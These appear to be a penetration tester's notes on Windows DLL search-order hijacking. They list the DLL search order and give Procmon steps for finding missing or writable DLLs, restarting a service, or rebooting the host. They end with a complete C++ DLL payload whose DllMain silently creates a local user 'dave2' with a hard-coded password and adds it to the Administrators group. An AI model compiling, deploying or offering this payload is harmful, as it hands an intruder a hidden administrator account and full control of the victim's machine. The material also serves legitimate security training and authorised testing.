
Search order in the safe DLL search mode, activated by default:
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.

#### Technique:
1. Copy the binary to a local machine
2. Run Procmon64 (requires admin, therefore the copy)
3. Set a filter to `Process Name is example.exe`
4. Run binary
5. Look for `CreateFile` calls in the `Operation` column
6. If the `Details` column says `Name not found`, look whether one of those directories is writeable for us on the actual target. In that case, we can just create a DLL in this path. Otherwise, we could look whether we have write permissions on some of the successfully called DLLs.
7. Restart the service. If we don't have the permission but we can restart the host (`whoami /priv`) and the service has the `StartMode` set to `Auto` (see [[2_loot_Windows_Template]]), we could restart the whole machine (`reboot /r /t 0`).

#### Example payload
Compile with the `--shared` flag, as shown in [[8_windowsCrosscompile]].
```c++
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave2 password123! /add");
  	    i = system ("net localgroup administrators dave2 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```